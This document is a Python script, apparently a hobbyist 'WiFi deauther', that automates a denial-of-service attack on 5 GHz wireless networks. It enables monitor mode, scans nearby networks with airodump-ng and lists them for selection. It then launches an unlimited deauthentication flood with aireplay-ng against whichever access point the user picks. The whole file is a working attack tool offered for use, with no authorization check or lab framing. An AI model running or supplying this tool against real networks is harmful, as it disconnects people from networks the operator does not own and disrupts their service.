#!/usr/bin/env python3

import subprocess
import os
import time
import signal
import sys

# Global variables
networks = []  # Store discovered 5 GHz networks
scanning = True  # Control the live scanning loop

# Banner
def print_banner():
    banner = r"""
 ::'###::::'########::'########:'##::::'##:'##::::'##::::'###:::::'######::'##:::'##:
::'## ##::: ##.... ##: ##.....:: ##:::: ##: ##:::: ##:::'## ##:::'##... ##: ##::'##::
:'##:. ##:: ##:::: ##: ##::::::: ##:::: ##: ##:::: ##::'##:. ##:: ##:::..:: ##:'##:::
'##:::. ##: ########:: ######::: ##:::: ##: #########:'##:::. ##: ##::::::: #####::::
 #########: ##.. ##::: ##...:::: ##:::: ##: ##.... ##: #########: ##::::::: ##. ##:::
 ##.... ##: ##::. ##:: ##::::::: ##:::: ##: ##:::: ##: ##.... ##: ##::: ##: ##:. ##::
 ##:::: ##: ##:::. ##: ########:. #######:: ##:::: ##: ##:::: ##:. ######:: ##::. ##:
..:::::..::..:::::..::........:::.......:::..:::::..::..:::::..:::......:::..::::..::
.....................................................................................
DEVELOPED BY ATHUL                                      WIFI DEAUTHER VER 1.0 (5 GHZ)
.....................................................................................
"""
    print(banner)

# Check for sudo privileges
if not 'SUDO_UID' in os.environ.keys():
    print("This script requires sudo privileges. Please run as root.")
    exit()

def check_dependencies():
    """Check if required tools are installed."""
    for tool in ["airmon-ng", "airodump-ng", "aireplay-ng", "iwconfig"]:
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            print(f"Error: {tool} is not installed. Install it using: sudo apt install aircrack-ng")
            exit()

def get_wifi_interfaces():
    """List all available WiFi interfaces."""
    result = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
    interfaces = [line.split()[0] for line in result.split("\n") if "IEEE 802.11" in line]
    return interfaces

def enable_monitor_mode(interface):
    """Enable monitor mode on the selected interface."""
    print(f"Enabling monitor mode on {interface}...")
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"Monitor mode enabled on {interface}.")

def is_5ghz_channel(channel):
    """Check if a channel is in the 5 GHz range."""
    try:
        channel = int(channel)
        return 36 <= channel <= 165  # Common 5 GHz channel range
    except ValueError:
        return False

def update_network_list(csv_file):
    """Parse networks from airodump-ng CSV file."""
    global networks
    if not os.path.exists(csv_file):
        return

    new_networks = []
    with open(csv_file, "r") as file:
        for line in file:
            if line.startswith("BSSID"):
                continue
            fields = line.split(",")
            if len(fields) > 14 and fields[13].strip() != "":
                channel = fields[3].strip()
                if is_5ghz_channel(channel):
                    network = {
                        "bssid": fields[0].strip(),
                        "channel": channel,
                        "essid": fields[13].strip()
                    }
                    if network not in networks:  # Add only unique networks
                        new_networks.append(network)

    if new_networks:
        networks.extend(new_networks)

def scan_networks_live(interface):
    """Live scan for 5 GHz WiFi networks using a loop."""
    global scanning
    print("Scanning for 5 GHz networks... Press Ctrl+C to stop.")
    try:
        process = subprocess.Popen(["airodump-ng", "--band", "a", "--output-format", "csv", "-w", "scan_results", interface],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        while scanning:
            time.sleep(2)  # Update every 2 seconds
            update_network_list("scan_results-01.csv")
            os.system("clear")
            print_banner()
            print("\nAvailable 5 GHz Networks:")
            print("Index\tBSSID\t\t\tChannel\tESSID")
            for index, network in enumerate(networks):
                print(f"{index}\t{network['bssid']}\t{network['channel']}\t{network['essid']}")
    except KeyboardInterrupt:
        signal_handler_stop_scan(None, None)  # Handle interrupt to stop scanning gracefully
    finally:
        process.terminate()

def deauth_attack(interface, bssid, channel):
    """Perform a deauthentication attack on the selected network."""
    print(f"Setting interface to channel {channel}...")
    subprocess.run(["iwconfig", interface, "channel", channel])

    print(f"Starting deauth attack on BSSID {bssid}...")
    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
    except KeyboardInterrupt:
        print("\nDeauth attack stopped.")

def cleanup():
    """Cleanup leftover files from airodump-ng."""
    for file in os.listdir():
        if file.startswith("scan_results"):
            os.remove(file)

def signal_handler_stop_scan(sig, frame):
    """Handle Ctrl+C to stop scanning without exiting."""
    global scanning
    if scanning:
        scanning = False  # Stop the live scanning loop
        print("\nScanning stopped. You can now select a network.\n")
    else:
        signal_handler_exit(sig, frame)

def signal_handler_exit(sig, frame):
    """Handle Ctrl+C to exit the script."""
    print("\nExiting the script. Cleaning up...")
    cleanup()
    sys.exit(0)

def select_network():
    """Allow the user to select a network after scanning."""
    global networks
    if not networks:
        print("No networks found during scanning.")
        return None
    os.system("clear")
    print_banner()
    print("Select a network from the list below:")
    print("Index\tBSSID\t\t\tChannel\tESSID")
    for index, network in enumerate(networks):
        print(f"{index}\t{network['bssid']}\t{network['channel']}\t{network['essid']}")
    
    while True:
        try:
            choice = int(input("\nEnter the index of the network to select: "))
            if 0 <= choice < len(networks):
                return networks[choice]
            else:
                print("Invalid choice. Try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")

def main():
    # Display banner at the beginning
    print_banner()
    # Set up signal handler for clean exit
    signal.signal(signal.SIGINT, signal_handler_stop_scan)

    check_dependencies()

    # Get WiFi interfaces
    interfaces = get_wifi_interfaces()
    if not interfaces:
        print("No WiFi interfaces found. Ensure your WiFi adapter is connected.")
        exit()

    print("Available interfaces:")
    for index, iface in enumerate(interfaces):
        print(f"{index}: {iface}")

    # Select interface
    while True:
        try:
            choice = int(input("Select an interface to use for the scan: "))
            selected_interface = interfaces[choice]
            break
        except (ValueError, IndexError):
            print("Invalid choice. Try again.")

    # Enable monitor mode
    enable_monitor_mode(selected_interface)

    # Start live scan for 5 GHz networks
    scan_networks_live(selected_interface)

    # Allow the user to select a network after scanning
    selected_network = select_network()
    if selected_network:
        print("\nSelected Network:")
        print(f"BSSID: {selected_network['bssid']}")
        print(f"Channel: {selected_network['channel']}")
        print(f"ESSID: {selected_network['essid']}")
        print("\nStarting deauthentication attack...")
        deauth_attack(selected_interface, selected_network['bssid'], selected_network['channel'])

    # Cleanup temporary files
    cleanup()

if __name__ == "__main__":
    main()
